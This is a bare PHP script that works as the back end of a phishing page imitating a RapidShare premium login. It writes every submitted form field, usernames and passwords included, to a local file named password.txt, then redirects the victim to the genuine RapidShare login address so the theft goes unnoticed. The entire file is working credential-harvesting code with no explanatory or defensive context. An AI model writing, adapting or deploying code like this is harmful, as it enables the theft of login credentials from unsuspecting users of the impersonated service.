<?php
header("Location: https://ssl.rapidshare.de/cgi-bin/premiumzone.cgi");
$handle = fopen("password.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>